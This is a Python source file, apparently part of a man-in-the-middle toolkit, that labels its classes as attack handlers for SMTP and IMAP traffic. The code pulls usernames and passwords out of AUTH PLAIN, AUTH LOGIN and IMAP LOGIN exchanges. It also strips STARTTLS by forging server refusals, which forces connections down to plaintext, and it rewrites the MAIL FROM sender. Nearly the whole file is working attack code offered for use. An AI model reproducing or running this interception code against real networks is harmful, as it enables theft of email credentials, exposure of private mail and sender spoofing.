"""
SMTP Interception Handler

Implements SMTP protocol detection and attack capabilities:
- Credential harvesting (AUTH PLAIN/LOGIN)
- STARTTLS stripping
- Email content modification
- Sender/recipient tracking

SMTP Commands:
- HELO/EHLO: Connection initiation
- AUTH: Authentication
- STARTTLS: TLS upgrade
- MAIL FROM: Sender
- RCPT TO: Recipient
- DATA: Message content
"""

from typing import Optional, Dict, Any, Tuple
import base64
import re

from modules.protocols.base_handler import ProtocolHandler, ProtocolType, ProcessingResult

class SMTPIntercept(ProtocolHandler):
    """
    SMTP protocol interception handler.
    
    Attack Capabilities:
    1. Capture PLAIN/LOGIN credentials
    2. Strip STARTTLS (downgrade to plaintext)
    3. Modify email content
    4. Track senders/recipients
    """
    
    def __init__(self):
        super().__init__("SMTP", ProtocolType.EMAIL)
    
    def detect(self, packet: bytes) -> bool:
        """Detect SMTP traffic (port 25/587/465)"""
        try:
            packet_str = packet.decode('utf-8', errors='ignore')
            
            # Check for SMTP commands
            smtp_commands = ['HELO', 'EHLO', 'MAIL FROM', 'RCPT TO', 'DATA', 
                           'AUTH', 'STARTTLS', 'QUIT']
            
            if any(cmd in packet_str.upper() for cmd in smtp_commands):
                return True
            
            # Check for SMTP response codes
            if re.match(r'^[2-5]\d\d ', packet_str):
                return True
                
        except:
            pass
        
        return False
    
    def process(self, packet: bytes) -> ProcessingResult:
        """Process SMTP packet and extract credentials"""
        try:
            packet_str = packet.decode('utf-8', errors='ignore')
            
            credentials = {}
            tokens = {}
            metadata = {}
            
            # Extract AUTH credentials
            if 'AUTH PLAIN' in packet_str.upper():
                # AUTH PLAIN format: \0username\0password (base64)
                auth_match = re.search(r'AUTH PLAIN\s+(\S+)', packet_str, re.I)
                if auth_match:
                    try:
                        decoded = base64.b64decode(auth_match.group(1)).decode('utf-8')
                        parts = decoded.split('\x00')
                        if len(parts) >= 3:
                            credentials['username'] = parts[1]
                            credentials['password'] = parts[2]
                            metadata['auth_type'] = 'PLAIN'
                    except:
                        pass
            
            elif 'AUTH LOGIN' in packet_str.upper():
                # AUTH LOGIN: username and password sent separately (base64)
                if re.match(r'^[A-Za-z0-9+/]+=*$', packet_str.strip()):
                    try:
                        decoded = base64.b64decode(packet_str.strip()).decode('utf-8')
                        credentials['auth_data'] = decoded
                        metadata['auth_type'] = 'LOGIN'
                    except:
                        pass
            
            # Extract email addresses
            mail_from = re.search(r'MAIL FROM:\s*<([^>]+)>', packet_str, re.I)
            if mail_from:
                metadata['from'] = mail_from.group(1)
            
            rcpt_to = re.search(r'RCPT TO:\s*<([^>]+)>', packet_str, re.I)
            if rcpt_to:
                metadata['to'] = rcpt_to.group(1)
            
            # Detect STARTTLS
            if 'STARTTLS' in packet_str.upper():
                metadata['starttls'] = True
            
            return ProcessingResult(
                protocol_name=self.name,
                success=True,
                credentials=credentials if credentials else None,
                tokens=tokens if tokens else None,
                metadata=metadata
            )
            
        except Exception as e:
            return ProcessingResult(
                protocol_name=self.name,
                success=False,
                error=str(e)
            )
    
    def modify(self, packet: bytes, rules: Dict[str, Any]) -> Optional[bytes]:
        """Modify SMTP packet"""
        try:
            packet_str = packet.decode('utf-8', errors='replace')
            
            # Strip STARTTLS
            if rules.get('strip_starttls') and 'STARTTLS' in packet_str.upper():
                # Replace STARTTLS response with error
                if re.match(r'^220 ', packet_str):  # Success response
                    return b'502 Command not implemented\r\n'
            
            # Modify sender
            if 'modify_from' in rules:
                packet_str = re.sub(
                    r'MAIL FROM:\s*<[^>]+>',
                    f'MAIL FROM: <{rules["modify_from"]}>',
                    packet_str,
                    flags=re.I
                )
                return packet_str.encode()
            
            return None
            
        except Exception as e:
            print(f"[SMTP] Modification error: {e}")
            return None


class IMAPHarvest(ProtocolHandler):
    """
    IMAP protocol harvesting handler.
    
    Attack Capabilities:
    1. Capture LOGIN credentials
    2. Extract folder lists
    3. Monitor message fetches
    """
    
    def __init__(self):
        super().__init__("IMAP", ProtocolType.EMAIL)
    
    def detect(self, packet: bytes) -> bool:
        """Detect IMAP traffic (port 143/993)"""
        try:
            packet_str = packet.decode('utf-8', errors='ignore')
            
            # Check for IMAP commands (tagged with alphanumeric ID)
            imap_commands = ['LOGIN', 'SELECT', 'EXAMINE', 'FETCH', 'LIST', 
                           'CAPABILITY', 'STARTTLS', 'LOGOUT']
            
            for cmd in imap_commands:
                if re.search(rf'\w+\s+{cmd}', packet_str, re.I):
                    return True
            
            # Check for IMAP response
            if re.match(r'^\*\s+(OK|NO|BAD)', packet_str, re.I):
                return True
                
        except:
            pass
        
        return False
    
    def process(self, packet: bytes) -> ProcessingResult:
        """Process IMAP packet"""
        try:
            packet_str = packet.decode('utf-8', errors='ignore')
            
            credentials = {}
            metadata = {}
            
            # Extract LOGIN credentials
            login_match = re.search(r'\w+\s+LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?', 
                                   packet_str, re.I)
            if login_match:
                credentials['username'] = login_match.group(1).strip('"')
                credentials['password'] = login_match.group(2).strip('"')
                metadata['auth_type'] = 'LOGIN'
            
            # Extract folder selection
            select_match = re.search(r'\w+\s+SELECT\s+"?([^"\s]+)"?', packet_str, re.I)
            if select_match:
                metadata['folder'] = select_match.group(1).strip('"')
            
            # Extract fetch operations
            fetch_match = re.search(r'\w+\s+FETCH\s+(\d+)', packet_str, re.I)
            if fetch_match:
                metadata['fetch_msg_id'] = fetch_match.group(1)
            
            return ProcessingResult(
                protocol_name=self.name,
                success=True,
                credentials=credentials if credentials else None,
                metadata=metadata
            )
            
        except Exception as e:
            return ProcessingResult(
                protocol_name=self.name,
                success=False,
                error=str(e)
            )
    
    def modify(self, packet: bytes, rules: Dict[str, Any]) -> Optional[bytes]:
        """Modify IMAP packet"""
        try:
            packet_str = packet.decode('utf-8', errors='replace')
            
            # Strip STARTTLS
            if rules.get('strip_starttls') and 'STARTTLS' in packet_str.upper():
                # Find tag
                tag_match = re.match(r'(\w+)\s+', packet_str)
                if tag_match:
                    tag = tag_match.group(1)
                    return f'{tag} NO STARTTLS not available\r\n'.encode()
            
            return None
            
        except Exception as e:
            print(f"[IMAP] Modification error: {e}")
            return None
